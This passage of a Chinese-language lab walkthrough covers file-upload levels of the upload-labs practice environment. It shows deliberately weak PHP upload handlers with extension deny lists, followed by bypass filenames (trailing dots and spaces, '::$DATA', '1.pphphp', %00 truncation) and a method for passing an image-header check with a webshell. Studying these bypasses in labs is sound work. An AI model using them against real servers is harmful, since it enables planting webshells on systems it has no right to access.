class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本样例未使用trim函数，去空格，采用空格绕过。</p><p>文件名称设置为1.php 。</p><h3 id="Pass-8-点绕过"><a href="#Pass-8-点绕过" class="headerlink" title="Pass-8-点绕过"></a>Pass-8-点绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>未过滤文件后面的点，并且未重命名，利用windows文件特性，采用点绕过。</p><p>文件命名为1.php.。</p><h3 id="Pass-8-流文件绕过"><a href="#Pass-8-流文件绕过" class="headerlink" title="Pass-8-流文件绕过"></a>Pass-8-流文件绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看代码可知，未过滤::$DATA，在windows创建文件时，会忽略::$DATA。</p><p>所以可以将文件命名为1.php::$DATA去绕过检测。</p><h3 id="Pass-10-系统命名绕过"><a href="#Pass-10-系统命名绕过" class="headerlink" title="Pass-10-系统命名绕过"></a>Pass-10-系统命名绕过</h3><p>和Pass-5一样。</p><h3 id="Pass-11-双写后缀名绕过"><a href="#Pass-11-双写后缀名绕过" class="headerlink" title="Pass-11-双写后缀名绕过"></a>Pass-11-双写后缀名绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看源码可以知道，利用str_ireplace函数将常见后缀替换为了空，双写后缀绕过即可。</p><p>文件命名为1.pphphp，这样经过str_ireplace函数就会去掉中间的php，剩下1.php了。</p><h3 id="Pass-12-GET00截断"><a href="#Pass-12-GET00截断" class="headerlink" title="Pass-12-GET00截断"></a>Pass-12-GET00截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，只允许上传jpg，png，gif，但是文件保存的地址前半部分通过get传参方式可以在抓包过程中给显示出来，所以可以采用00截断。</p><p>所谓00截断，就是利用了GET提交参数到服务器系统中，系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。<br><img src="https://s2.loli.net/2022/02/09/tOT2i7dJh9opECR.png"><br>说白了就是保存会变成这个样子的路径，upload/1.php%004234234131.jpg。但是系统读取文件时，遇到%00就停止了，所以相当于就是1.php。</p><p>但是00截断要求比较多，截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</p><h3 id="Pass-13-POST00截断"><a href="#Pass-13-POST00截断" class="headerlink" title="Pass-13-POST00截断"></a>Pass-13-POST00截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和get00截断差不多，只是需要手动去改下hex相关位置为00，在新版burp suite中移除了hex界面，相对的，我们只需要高亮我们修改字符，然后在右侧的窗口即可修改其对应hex。</p><h3 id="Pass-14-文件头判断"><a href="#Pass-14-文件头判断" class="headerlink" title="Pass-14-文件头判断"></a>Pass-14-文件头判断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码分析了文件上传的文件的前两个字节是否满足标准文件格式，然后返回了文件类型，利用返回的文件类型，重命名生成了文件。</p><p>我们可以利用图片码来绕过检测，也就是将修改webshell的前两个字节，使其能够过检测。</p><p>图片马就是向图片中插入我们的一句话木马，实际上如果只是过文件头的话，并不需要全部文件，只需要添上相应头文件就行。<br>网上总结的几种方法，<a 